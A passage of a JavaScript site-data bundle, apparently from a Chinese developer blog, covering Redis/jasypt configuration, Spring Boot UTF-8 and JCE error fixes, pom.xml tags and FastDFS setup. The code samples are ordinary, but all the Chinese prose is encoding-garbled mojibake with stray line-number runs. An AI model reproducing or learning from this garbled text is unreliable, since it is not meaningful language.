}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n\n\nå¾å°å å¯å¯ç è¿è¡æ¿æ¢\n\n  redis:\n    host: 192.168.81.101\n    password: enc(u1itoza4xt3qmyg1vjga9fc0wduaq59/)\n    database: 0\n    port: 26379\n    timeout: 10000\n    sentinel:\n      nodes:\n        - 192.168.81.101:26379\n        - 192.168.81.102:26379\n      password: enc(1iye4/wqjqshmfkkvvplag==)\n      master: mymaster\n      enable: true\n    lettuce:\n      pool:\n        max-wait: 10000\n        max-active: 30\n        max-idle: 15\n        min-idle: 15\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nå»ºè®®é¨ç½²çæ¶å ç ä¸è¦æ¾å°éç½®æä»¶ï¼å¯ä»¥ç¨å¯å¨åæ° -djasypt.encryptor.password=aabbcc æ¥æ¿ä»£ã',charsets:{cjk:!0}},{title:"Spring Boot VUEååç«¯å è§£å¯",frontmatter:{title:"Spring Boot VUEååç«¯å è§£å¯",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/207/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/23.springboot/207.Spring%20Boot%20VUE%E5%89%8D%E5%90%8E%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86.html",relativePath:"00.java/20.Spring/23.springboot/207.Spring Boot VUEååç«¯å è§£å¯.md",key:"v-90a50632",path:"/spring/spring-boot/207/",headers:[{level:2,title:"Malformed UTF-8 data",slug:"malformed-utf-8-data",normalizedTitle:"malformed utf-8 data",charIndex:2},{level:2,title:"ecurityException: JCE cannot authenticate the provider BC",slug:"ecurityexception-jce-cannot-authenticate-the-provider-bc",normalizedTitle:"ecurityexception: jce cannot authenticate the provider bc",charIndex:309}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"Malformed UTF-8 data ecurityException: JCE cannot authenticate the provider BC",content:'# Malformed UTF-8 data\n\næ´ä¸ªé®é¢è¿æ¯æ¯è¾å¥æªçï¼å¨ idea è¿è¡çæ¶åæ²¡æé®é¢ï¼æåç«¯æåçæä»¶æ¾å°åç«¯æ´åå¹¶ææ jar ååå°±åºç°äºï¼æ¾å°ä¸ç¯ææ¡£è¯´æ¯å¯å¨ jar çæ¶åå å¥ -Dfile.encoding=UTF-8 å³å¯\n\njava "-Dfile.encoding=UTF-8" -jar tool-boot-0.0.1-SNAPSHOT.jar\n\n\n1\n\n\nä½å¦æä½ æ¯ tomcatï¼éè¦å¨ catalina.bat ä¸­è®¾ç½®\n\nset "JAVA_OPTS=%JAVA_OPTS% %LOGGING_CONFIG% -Dfile.encoding=UTF-8"\n\n\n1\n\n\n\n# ecurityException: JCE cannot authenticate the provider BC\n\nåºç°è¿ééè¯¯æ¯ç±äº jdk éªç­¾é®é¢ï¼oracle ç jdk å¤§é¨åäººåç¨ï¼ä½æ¯ç°å¨æ´æ¨è openjdkï¼æ¢æ openjdk å°±ä¸ä¼ååºç°è¿ç±»é®é¢',normalizedContent:'# malformed utf-8 data\n\næ´ä¸ªé®é¢è¿æ¯æ¯è¾å¥æªçï¼å¨ idea è¿è¡çæ¶åæ²¡æé®é¢ï¼æåç«¯æåçæä»¶æ¾å°åç«¯æ´åå¹¶ææ jar ååå°±åºç°äºï¼æ¾å°ä¸ç¯ææ¡£è¯´æ¯å¯å¨ jar çæ¶åå å¥ -dfile.encoding=utf-8 å³å¯\n\njava "-dfile.encoding=utf-8" -jar tool-boot-0.0.1-snapshot.jar\n\n\n1\n\n\nä½å¦æä½ æ¯ tomcatï¼éè¦å¨ catalina.bat ä¸­è®¾ç½®\n\nset "java_opts=%java_opts% %logging_config% -dfile.encoding=utf-8"\n\n\n1\n\n\n\n# ecurityexception: jce cannot authenticate the provider bc\n\nåºç°è¿ééè¯¯æ¯ç±äº jdk éªç­¾é®é¢ï¼oracle ç jdk å¤§é¨åäººåç¨ï¼ä½æ¯ç°å¨æ´æ¨è openjdkï¼æ¢æ openjdk å°±ä¸ä¼ååºç°è¿ç±»é®é¢',charsets:{cjk:!0}},{title:"pom æä»¶ä»ç»å parentãproperties æ ç­¾è¯¦è§£",frontmatter:{title:"pom æä»¶ä»ç»å parentãproperties æ ç­¾è¯¦è§£",date:"2023-06-25T09:22:36.000Z",permalink:"/maven/2300/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/2300.maven/2300.pom%20%E6%96%87%E4%BB%B6%E4%BB%8B%E7%BB%8D%E5%8F%8A%20parent%E3%80%81properties%20%E6%A0%87%E7%AD%BE%E8%AF%A6%E8%A7%A3.html",relativePath:"00.java/2300.maven/2300.pom æä»¶ä»ç»å parentãproperties æ ç­¾è¯¦è§£.md",key:"v-4452e22a",path:"/maven/2300/",headers:[{level:2,title:"pom.xml ä»ç»",slug:"pom-xml-ä»ç»",normalizedTitle:"pom.xml ä»ç»",charIndex:2},{level:2,title:"parent æ ç­¾è¯¦è§£",slug:"parent-æ ç­¾è¯¦è§£",normalizedTitle:"parent æ ç­¾è¯¦è§£",charIndex:4061},{level:2,title:"properties æ ç­¾è¯¦è§£",slug:"properties-æ ç­¾è¯¦è§£",normalizedTitle:"properties æ ç­¾è¯¦è§£",charIndex:4813}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"pom.xml ä»ç» parent æ ç­¾è¯¦è§£ properties æ ç­¾è¯¦è§£",content:'# pom.xml ä»ç»\n\npom ä½ä¸ºé¡¹ç®å¯¹è±¡æ¨¡åãéè¿ xml è¡¨ç¤º maven é¡¹ç®ï¼ä½¿ç¨ pom.xml æ¥å®ç°ãä¸»è¦æè¿°äºé¡¹ç®ï¼åæ¬éç½®æä»¶ï¼å¼åèéè¦éµå¾ªçè§åï¼ç¼ºé·ç®¡çç³»ç»ï¼ç»ç»å licensesï¼é¡¹ç®ç urlï¼é¡¹ç®çä¾èµæ§ï¼ä»¥åå¶ä»ææçé¡¹ç®ç¸å³å ç´ ã\n\npom ä¸­çæè¿°ä¿¡æ¯é½æ¯ç¨ xml æ ç­¾çæ¹å¼ï¼å¶ä¸­åå«åæ ç­¾ååæ ç­¾ï¼æé¡¶é¨ç¨äºæè¿° xml å¾çæ¬åç¼ç ï¼å¶æ¬¡æ¯ä»¥ project å¼å¤´å¾åæ ç­¾å¹¶è¡¨ç¤ºä¸ºä¸ä¸ªé¡¹ç®ï¼å®ä¹äºè¯¥é¡¹ç®å¯ç¨åå®¹åè§èã\n\n# åæ ç­¾\n<project></project>\n\n# åæ ç­¾\n<project/>\n\n\n1\n2\n3\n4\n5\n\n\nå¯¹äº pom å¯ç¨åå®¹è¾å¤ï¼ä¸çº§æ ç­¾æå¦ä¸è¡¨æç¤ºï¼ä½å¸¸ç¨çé½ä¼æå¯¹åºçæè¿°\n\næ ç­¾                       æè¿°\nmodelVersion             å½åæ¨¡åä½¿ç¨ççæ¬\nparent                   ç»§æ¿æä¸ª pomï¼é¨åæ¯ä¸å¯ç»§æ¿ç\ngroupId                  å¬å¸æç»ç»çå¯ä¸æ è¯ï¼å¦ org.springframework.boot ç¬¬ä¸æ®µæ¯åï¼orgãcom\n                         éçå©ç»ç»ãåä¸ç»ç»ï¼ï¼ç¬¬äºæ®µæ¯å¬å¸åç§°ï¼ç¬¬ä¸æ®µæ¯åºç¨åç§°\nartifactId               é¡¹ç®çå¯ä¸ ID\nversion                  é¡¹ç®æå±ççæ¬å·\nname                     é¡¹ç®åç§°\ndescription              é¡¹ç®æè¿°ä¿¡æ¯\nproperties               éç½®ä¿¡æ¯æè¿°ï¼æ´å¤çæ¯æè¿°ä¾èµ jar çæ¬ãé¡¹ç®çæ¬ç­\ndependencies             æè¦ä¾èµç jar é½éè¦å¨è¿éæè¿°\nbuild                    æå»ºä¿¡æ¯ï¼åæ¬æä»¶ï¼èµæºæä»¶ä¿¡æ¯ç­\nprofiles                 ä½ç¨äºé¡¹ç®ç¯å¢çåæ¢ï¼devãtestãproduceï¼\npackaging                æè¿°é¡¹ç®çç±»åï¼å¯é pomãjarãwar\nrepositories             ç¨æ¯ç¨æ¥éç½® maven é¡¹ç®çè¿ç¨ä»åºï¼å¯ä»¥æ¯ç§æï¼nexusï¼\nmodules                  ç¨æ¥éç½®å­é¡¹ç®\ndependencyManagement     ç¨æ¥æä¾äºä¸ç§ç®¡çä¾èµçæ¬å·çæ¹å¼ãéå¸¸ä¼å¨é¡¹ç®çæé¡¶å±çç¶ POM ä¸­çå°è¯¥åç´ ãä½¿ç¨ pom.xml ä¸­ç\n                         dependencyManagement åç´ è½è®©ææå¨å­é¡¹ç®ä¸­å¼ç¨ä¸ä¸ªä¾èµèä¸ç¨æ¾å¼çååºçæ¬å·\ndistributionManagement   ç¨äºååæä»¶å°è¿ç¨ä»åºï¼mvn install ä¼å°é¡¹ç®çæçæä»¶å®è£å°æ¬å° Maven ä»åºï¼mvn deploy\n                         ç¨æ¥å°é¡¹ç®çæçæä»¶ååå°è¿ç¨ Maven ä»åºãæ¬å° Maven ä»åºçæä»¶åªè½ä¾å½åç¨æ·ä½¿ç¨ï¼å¨ååå°è¿ç¨\n                         Maven ä»åºä¹åï¼ææè½è®¿é®è¯¥ä»åºçç¨æ·é½è½ä½¿ç¨ä½ çæä»¶ã\npluginRepositories       éç½® Maven ä»ä»ä¹å°æ¹ä¸è½½æä»¶\nscm                      éæäºè½¯ä»¶éç½®ç®¡ççï¼ä»å¯ä»¥æ¯ææä»¬å¸¸ç¨ SVNãCVS ç­\ndevelopers               éç½®å¼åèä¿¡æ¯ï¼ä¾å¦ï¼ä¸ä¸ªå¼åèå¯ä»¥æå¤ä¸ª rolesï¼properties\nissueManagement          bug è·è¸ªç®¡çç³»ç»ï¼å®ä¹ defect tracking system ç¼ºé·è·è¸ªç³»ç»\nreporting                åå« site çæé¶æ®µçä¸äºåç´ ï¼æäº maven plugin å¯ä»¥çæ reports å¹¶ä¸å¨ reporting\n                         ä¸éç½®\nurl                      å¼åå¢éçç½ç«ï¼æ å³ç´§è¦å¯é\nlicenses                 è®¸å¯è¯ä¿¡æ¯éç½®\norganization             éç½®ç»ç»ä¿¡æ¯\nciManagement             ?\ncontributors             ?\ninceptionYear            ?\nmailingLists             ?\nprerequisites            ?\nreports                  ?\n\nä»¥ä¸ä¸ª spring boot å¸¸è§é¡¹ç®åä¸ºç¤ºä¾ï¼\n\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelVersion>4.0.0</modelVersion>\n    \x3c!-- ç»§æ¿spring-bootä½¿ç¨ä»çç¸å³ä¾èµ --\x3e\n    <parent>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-parent</artifactId>\n        <version>2.6.9</version>\n        <relativePath/> \x3c!-- lookup parent from repository --\x3e\n    </parent>\n    \x3c!-- ç»ç»ï¼åºç¨ --\x3e\n    <groupId>com.xxx.boot</groupId>\n    \x3c!-- é¡¹ç®IDï¼ä¸è¬é½åæ¬¢æ¯åç§° --\x3e\n    <artifactId>framework</artifactId>\n    \x3c!-- çæ¬ --\x3e\n    <version>0.0.1-SNAPSHOT</version>\n    \x3c!-- é¡¹ç®åç§° --\x3e\n    <name>newFramework</name>\n    <description>Demo project for Spring Boot</description>\n    \x3c!-- éç½®æè¿° --\x3e\n    <properties>\n        \x3c!-- javaçæ¬ï¼ä½è¿ä¸ªå®éæ²¡ä»ä¹ç¨ï¼ååä¸ç§æè¿°ä¿¡æ¯ç --\x3e\n        <java.version>17</java.version>\n        \x3c!-- å®éæå®ç¼è¯çæ¬å¯ä»¥ä½¿ç¨å¦ä¸ --\x3e\n        <maven.complier.source>17</maven.complier.source>\n        <maven.complier.target>17</maven.complier.target>\n    </properties>\n    \n    \x3c!-- ä¾èµ --\x3e\n    <dependencies>\n        \x3c!-- å·ä½ä¾èµ --\x3e\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-web</artifactId>\n        </dependency>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-test</artifactId>\n            <scope>test</scope>\n        </dependency>\n    </dependencies>\n    \x3c!-- æå»ºä¿¡æ¯ --\x3e\n    <build>\n        \x3c!-- æä»¶ --\x3e\n        <plugins>\n            <plugin>\n                <groupId>org.springframework.boot</groupId>\n                <artifactId>spring-boot-maven-plugin</artifactId>\n            </plugin>\n        </plugins>\n    </build>\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n\n\n# parent æ ç­¾è¯¦è§£\n\n<parent></parent> æ ç­¾ç¨äºç»§æ¿ç¶é¡¹ç®çåç±»ä¾èµåå¶ä»éç½®ä¿¡æ¯ï¼å¦çæ¬ï¼æå»ºä¿¡æ¯ï¼éç½®æè¿°ç­ï¼å·ä½èå´åæ¬ï¼\n\n# å¯ä»¥ç»§æ¿é¨å\ngroupIdãversionãdescriptionãurlãinceptionYearãorganizationãlicensesãdevelopersãcontributorsãmailingListsãscmãissueManagementãciManagementãpropertiesãdependencyManagementãdependenciesãrepositoriesãpluginRepositoriesãbuildãreportingãprofiles\n\n# ä¸å¯ç»§æ¿é¨å\nartifactIdãnameãprerequisites\n\n\n1\n2\n3\n4\n5\n\n\nä¸ä¸ª parent éæåå«å¨é¨åå®¹æï¼\n\n<parent>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-parent</artifactId>\n    <version>2.6.9</version>\n    <relativePath/>\n</parent>\n\n\n1\n2\n3\n4\n5\n6\n\n\n<relativePath/> åç´ ï¼å®å¯ä»¥åæ ç­¾ä¹å¯ä»¥æ¯åæ ç­¾ <relativePath>../my-parent</relativePath> ãå®ä¸æ¯å¿éçï¼ä½å¯ä»¥ç¨ä½ Maven çæç¤ºç¬¦ï¼ç¶ååæç´¢è¯¥é¡¹ç®çç¶çº§çç»å®è·¯å¾ï¼ç¶ååæç´¢æ¬å°åè¿ç¨å­å¨åºï¼åæ ç­¾ä¸ºé»è®¤ä»å½å pom.xml çç¶çº§ç®å½æ¥æ¾ã\n\n\n# properties æ ç­¾è¯¦è§£\n\n<properties></properties> æ²¡ææä¾ä»ä¹å®è´¨æ§çåå®¹ä¾æä»¬ä½¿ç¨ï¼æ£æ¥ä¸æ¥å¨éé¢æå¤å¯ä»¥å¨æè¿°ä¸ä¸ª <project></project> æ ç­¾å¯ç¨ï¼ä½ä½ç¨å¹¶ä¸æ¯ä¸å¤§ãå®éä½ç¨æ´å¤å¨äºæè¿°æä»¬ä¾èµ jar ççæ¬ç­ã\n\n<properties>\n    \x3c!-- javaçæ¬ï¼ä½è¿ä¸ªå®éæ²¡ä»ä¹ç¨ï¼ååä¸ç§æè¿°ä¿¡æ¯ç --\x3e\n    <java.version>17</java.version>\n    \x3c!-- å®éæå®ç¼è¯çæ¬å¯ä»¥ä½¿ç¨å¦ä¸ --\x3e\n    <maven.complier.source>17</maven.complier.source>\n    <maven.complier.target>17</maven.complier.target>\n    \x3c!-- å®ä¹lombokçæ¬ --\x3e\n    <lombok.version>1.18.24</lombok.version>\n    <project.version>0.0.1-SNAPSHOT</project.version>\n</properties>\n\x3c!-- é¡¹ç®çæ¬ --\x3e\n<version>${project.version}</version>\n\x3c!-- ä¾èµ --\x3e\n<dependencies>\n    <dependency>\n        <groupId>org.projectlombok</groupId>\n        <artifactId>lombok</artifactId>\n        <version>${lombok.version}</version>\n    </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n',normalizedContent:'# pom.xml ä»ç»\n\npom ä½ä¸ºé¡¹ç®å¯¹è±¡æ¨¡åãéè¿ xml è¡¨ç¤º maven é¡¹ç®ï¼ä½¿ç¨ pom.xml æ¥å®ç°ãä¸»è¦æè¿°äºé¡¹ç®ï¼åæ¬éç½®æä»¶ï¼å¼åèéè¦éµå¾ªçè§åï¼ç¼ºé·ç®¡çç³»ç»ï¼ç»ç»å licensesï¼é¡¹ç®ç urlï¼é¡¹ç®çä¾èµæ§ï¼ä»¥åå¶ä»ææçé¡¹ç®ç¸å³å ç´ ã\n\npom ä¸­çæè¿°ä¿¡æ¯é½æ¯ç¨ xml æ ç­¾çæ¹å¼ï¼å¶ä¸­åå«åæ ç­¾ååæ ç­¾ï¼æé¡¶é¨ç¨äºæè¿° xml å¾çæ¬åç¼ç ï¼å¶æ¬¡æ¯ä»¥ project å¼å¤´å¾åæ ç­¾å¹¶è¡¨ç¤ºä¸ºä¸ä¸ªé¡¹ç®ï¼å®ä¹äºè¯¥é¡¹ç®å¯ç¨åå®¹åè§èã\n\n# åæ ç­¾\n<project></project>\n\n# åæ ç­¾\n<project/>\n\n\n1\n2\n3\n4\n5\n\n\nå¯¹äº pom å¯ç¨åå®¹è¾å¤ï¼ä¸çº§æ ç­¾æå¦ä¸è¡¨æç¤ºï¼ä½å¸¸ç¨çé½ä¼æå¯¹åºçæè¿°\n\næ ç­¾                       æè¿°\nmodelversion             å½åæ¨¡åä½¿ç¨ççæ¬\nparent                   ç»§æ¿æä¸ª pomï¼é¨åæ¯ä¸å¯ç»§æ¿ç\ngroupid                  å¬å¸æç»ç»çå¯ä¸æ è¯ï¼å¦ org.springframework.boot ç¬¬ä¸æ®µæ¯åï¼orgãcom\n                         éçå©ç»ç»ãåä¸ç»ç»ï¼ï¼ç¬¬äºæ®µæ¯å¬å¸åç§°ï¼ç¬¬ä¸æ®µæ¯åºç¨åç§°\nartifactid               é¡¹ç®çå¯ä¸ id\nversion                  é¡¹ç®æå±ççæ¬å·\nname                     é¡¹ç®åç§°\ndescription              é¡¹ç®æè¿°ä¿¡æ¯\nproperties               éç½®ä¿¡æ¯æè¿°ï¼æ´å¤çæ¯æè¿°ä¾èµ jar çæ¬ãé¡¹ç®çæ¬ç­\ndependencies             æè¦ä¾èµç jar é½éè¦å¨è¿éæè¿°\nbuild                    æå»ºä¿¡æ¯ï¼åæ¬æä»¶ï¼èµæºæä»¶ä¿¡æ¯ç­\nprofiles                 ä½ç¨äºé¡¹ç®ç¯å¢çåæ¢ï¼devãtestãproduceï¼\npackaging                æè¿°é¡¹ç®çç±»åï¼å¯é pomãjarãwar\nrepositories             ç¨æ¯ç¨æ¥éç½® maven é¡¹ç®çè¿ç¨ä»åºï¼å¯ä»¥æ¯ç§æï¼nexusï¼\nmodules                  ç¨æ¥éç½®å­é¡¹ç®\ndependencymanagement     ç¨æ¥æä¾äºä¸ç§ç®¡çä¾èµçæ¬å·çæ¹å¼ãéå¸¸ä¼å¨é¡¹ç®çæé¡¶å±çç¶ pom ä¸­çå°è¯¥åç´ ãä½¿ç¨ pom.xml ä¸­ç\n                         dependencymanagement åç´ è½è®©ææå¨å­é¡¹ç®ä¸­å¼ç¨ä¸ä¸ªä¾èµèä¸ç¨æ¾å¼çååºçæ¬å·\ndistributionmanagement   ç¨äºååæä»¶å°è¿ç¨ä»åºï¼mvn install ä¼å°é¡¹ç®çæçæä»¶å®è£å°æ¬å° maven ä»åºï¼mvn deploy\n                         ç¨æ¥å°é¡¹ç®çæçæä»¶ååå°è¿ç¨ maven ä»åºãæ¬å° maven ä»åºçæä»¶åªè½ä¾å½åç¨æ·ä½¿ç¨ï¼å¨ååå°è¿ç¨\n                         maven ä»åºä¹åï¼ææè½è®¿é®è¯¥ä»åºçç¨æ·é½è½ä½¿ç¨ä½ çæä»¶ã\npluginrepositories       éç½® maven ä»ä»ä¹å°æ¹ä¸è½½æä»¶\nscm                      éæäºè½¯ä»¶éç½®ç®¡ççï¼ä»å¯ä»¥æ¯ææä»¬å¸¸ç¨ svnãcvs ç­\ndevelopers               éç½®å¼åèä¿¡æ¯ï¼ä¾å¦ï¼ä¸ä¸ªå¼åèå¯ä»¥æå¤ä¸ª rolesï¼properties\nissuemanagement          bug è·è¸ªç®¡çç³»ç»ï¼å®ä¹ defect tracking system ç¼ºé·è·è¸ªç³»ç»\nreporting                åå« site çæé¶æ®µçä¸äºåç´ ï¼æäº maven plugin å¯ä»¥çæ reports å¹¶ä¸å¨ reporting\n                         ä¸éç½®\nurl                      å¼åå¢éçç½ç«ï¼æ å³ç´§è¦å¯é\nlicenses                 è®¸å¯è¯ä¿¡æ¯éç½®\norganization             éç½®ç»ç»ä¿¡æ¯\ncimanagement             ?\ncontributors             ?\ninceptionyear            ?\nmailinglists             ?\nprerequisites            ?\nreports                  ?\n\nä»¥ä¸ä¸ª spring boot å¸¸è§é¡¹ç®åä¸ºç¤ºä¾ï¼\n\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0" xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelversion>4.0.0</modelversion>\n    \x3c!-- ç»§æ¿spring-bootä½¿ç¨ä»çç¸å³ä¾èµ --\x3e\n    <parent>\n        <groupid>org.springframework.boot</groupid>\n        <artifactid>spring-boot-starter-parent</artifactid>\n        <version>2.6.9</version>\n        <relativepath/> \x3c!-- lookup parent from repository --\x3e\n    </parent>\n    \x3c!-- ç»ç»ï¼åºç¨ --\x3e\n    <groupid>com.xxx.boot</groupid>\n    \x3c!-- é¡¹ç®idï¼ä¸è¬é½åæ¬¢æ¯åç§° --\x3e\n    <artifactid>framework</artifactid>\n    \x3c!-- çæ¬ --\x3e\n    <version>0.0.1-snapshot</version>\n    \x3c!-- é¡¹ç®åç§° --\x3e\n    <name>newframework</name>\n    <description>demo project for spring boot</description>\n    \x3c!-- éç½®æè¿° --\x3e\n    <properties>\n        \x3c!-- javaçæ¬ï¼ä½è¿ä¸ªå®éæ²¡ä»ä¹ç¨ï¼ååä¸ç§æè¿°ä¿¡æ¯ç --\x3e\n        <java.version>17</java.version>\n        \x3c!-- å®éæå®ç¼è¯çæ¬å¯ä»¥ä½¿ç¨å¦ä¸ --\x3e\n        <maven.complier.source>17</maven.complier.source>\n        <maven.complier.target>17</maven.complier.target>\n    </properties>\n    \n    \x3c!-- ä¾èµ --\x3e\n    <dependencies>\n        \x3c!-- å·ä½ä¾èµ --\x3e\n        <dependency>\n            <groupid>org.springframework.boot</groupid>\n            <artifactid>spring-boot-starter-web</artifactid>\n        </dependency>\n        <dependency>\n            <groupid>org.springframework.boot</groupid>\n            <artifactid>spring-boot-starter-test</artifactid>\n            <scope>test</scope>\n        </dependency>\n    </dependencies>\n    \x3c!-- æå»ºä¿¡æ¯ --\x3e\n    <build>\n        \x3c!-- æä»¶ --\x3e\n        <plugins>\n            <plugin>\n                <groupid>org.springframework.boot</groupid>\n                <artifactid>spring-boot-maven-plugin</artifactid>\n            </plugin>\n        </plugins>\n    </build>\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n\n\n# parent æ ç­¾è¯¦è§£\n\n<parent></parent> æ ç­¾ç¨äºç»§æ¿ç¶é¡¹ç®çåç±»ä¾èµåå¶ä»éç½®ä¿¡æ¯ï¼å¦çæ¬ï¼æå»ºä¿¡æ¯ï¼éç½®æè¿°ç­ï¼å·ä½èå´åæ¬ï¼\n\n# å¯ä»¥ç»§æ¿é¨å\ngroupidãversionãdescriptionãurlãinceptionyearãorganizationãlicensesãdevelopersãcontributorsãmailinglistsãscmãissuemanagementãcimanagementãpropertiesãdependencymanagementãdependenciesãrepositoriesãpluginrepositoriesãbuildãreportingãprofiles\n\n# ä¸å¯ç»§æ¿é¨å\nartifactidãnameãprerequisites\n\n\n1\n2\n3\n4\n5\n\n\nä¸ä¸ª parent éæåå«å¨é¨åå®¹æï¼\n\n<parent>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-starter-parent</artifactid>\n    <version>2.6.9</version>\n    <relativepath/>\n</parent>\n\n\n1\n2\n3\n4\n5\n6\n\n\n<relativepath/> åç´ ï¼å®å¯ä»¥åæ ç­¾ä¹å¯ä»¥æ¯åæ ç­¾ <relativepath>../my-parent</relativepath> ãå®ä¸æ¯å¿éçï¼ä½å¯ä»¥ç¨ä½ maven çæç¤ºç¬¦ï¼ç¶ååæç´¢è¯¥é¡¹ç®çç¶çº§çç»å®è·¯å¾ï¼ç¶ååæç´¢æ¬å°åè¿ç¨å­å¨åºï¼åæ ç­¾ä¸ºé»è®¤ä»å½å pom.xml çç¶çº§ç®å½æ¥æ¾ã\n\n\n# properties æ ç­¾è¯¦è§£\n\n<properties></properties> æ²¡ææä¾ä»ä¹å®è´¨æ§çåå®¹ä¾æä»¬ä½¿ç¨ï¼æ£æ¥ä¸æ¥å¨éé¢æå¤å¯ä»¥å¨æè¿°ä¸ä¸ª <project></project> æ ç­¾å¯ç¨ï¼ä½ä½ç¨å¹¶ä¸æ¯ä¸å¤§ãå®éä½ç¨æ´å¤å¨äºæè¿°æä»¬ä¾èµ jar ççæ¬ç­ã\n\n<properties>\n    \x3c!-- javaçæ¬ï¼ä½è¿ä¸ªå®éæ²¡ä»ä¹ç¨ï¼ååä¸ç§æè¿°ä¿¡æ¯ç --\x3e\n    <java.version>17</java.version>\n    \x3c!-- å®éæå®ç¼è¯çæ¬å¯ä»¥ä½¿ç¨å¦ä¸ --\x3e\n    <maven.complier.source>17</maven.complier.source>\n    <maven.complier.target>17</maven.complier.target>\n    \x3c!-- å®ä¹lombokçæ¬ --\x3e\n    <lombok.version>1.18.24</lombok.version>\n    <project.version>0.0.1-snapshot</project.version>\n</properties>\n\x3c!-- é¡¹ç®çæ¬ --\x3e\n<version>${project.version}</version>\n\x3c!-- ä¾èµ --\x3e\n<dependencies>\n    <dependency>\n        <groupid>org.projectlombok</groupid>\n        <artifactid>lombok</artifactid>\n        <version>${lombok.version}</version>\n    </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n',charsets:{cjk:!0}},{title:"Spring Boot éæ FastDFS",frontmatter:{title:"Spring Boot éæ FastDFS",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/206/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/23.springboot/206.Spring%20Boot%20%E9%9B%86%E6%88%90%20FastDFS.html",relativePath:"00.java/20.Spring/23.springboot/206.Spring Boot éæ FastDFS.md",key:"v-689c946e",path:"/spring/spring-boot/206/",headers:[{level:2,title:"å®è£FastDFS",slug:"å®è£fastdfs",normalizedTitle:"å®è£ fastdfs",charIndex:2},{level:3,title:"ç³»ç»è½¯ä»¶",slug:"ç³»ç»è½¯ä»¶",normalizedTitle:"ç³»ç»è½¯ä»¶",charIndex:17},{level:3,title:"ç¼è¯ç¯å¢",slug:"ç¼è¯ç¯å¢",normalizedTitle:"ç¼è¯ç¯å¢",charIndex:238},{level:3,title:"ç£çç®å½",slug:"ç£çç®å½",normalizedTitle:"ç£çç®å½",charIndex:1452},{level:3,title:"å®è£libfastcommon",slug:"å®è£libfastcommon",normalizedTitle:"å®è£ libfastcommon",charIndex:1589},{level:3,title:"å®è£FastDFS",slug:"å®è£fastdfs-2",normalizedTitle:"å®è£ fastdfs",charIndex:2},{level:3,title:"å®è£fastdfs-nginx-module",slug:"å®è£fastdfs-nginx-module",normalizedTitle:"å®è£ fastdfs-nginx-module",charIndex:2226},{level:2,title:"åæºé¨ç½²",slug:"åæºé¨ç½²",normalizedTitle:"åæºé¨ç½²",charIndex:2573},{level:3,title:"trackeréç½®",slug:"trackeréç½®",normalizedTitle:"tracker éç½®",charIndex:2582},{level:3,title:"storageéç½®",slug:"storageéç½®",normalizedTitle:"storage éç½®",charIndex:2776},{level:3,title:"å¯å¨",slug:"å¯å¨",normalizedTitle:"å¯å¨",charIndex:3084},{level:4,title:"tracker",slug:"tracker",normalizedTitle:"tracker",charIndex:1907},{level:4,title:"storage",slug:"storage",normalizedTitle:"storage",charIndex:1963},{level:3,title:"clientæµè¯",slug:"clientæµè¯",normalizedTitle:"client æµè¯",charIndex:3493},{level:3,title:"nginx éç½®è®¿é®",slug:"nginx-éç½®è®¿é®",normalizedTitle:"nginx éç½®è®¿é®",charIndex:3962},{level:2,title:"åå¸å¼é¨ç½²",slug:"åå¸å¼é¨ç½²",normalizedTitle:"åå¸å¼é¨ç½²",charIndex:5235},{level:3,title:"storageéç½®",slug:"storageéç½®-2",normalizedTitle:"storage éç½®",charIndex:2776},{level:3,title:"clientæµè¯",slug:"clientæµè¯-2",normalizedTitle:"client æµè¯",charIndex:3493},{level:3,title:"éç½®nginxè®¿é®",slug:"éç½®nginxè®¿é®",normalizedTitle:"éç½® nginx 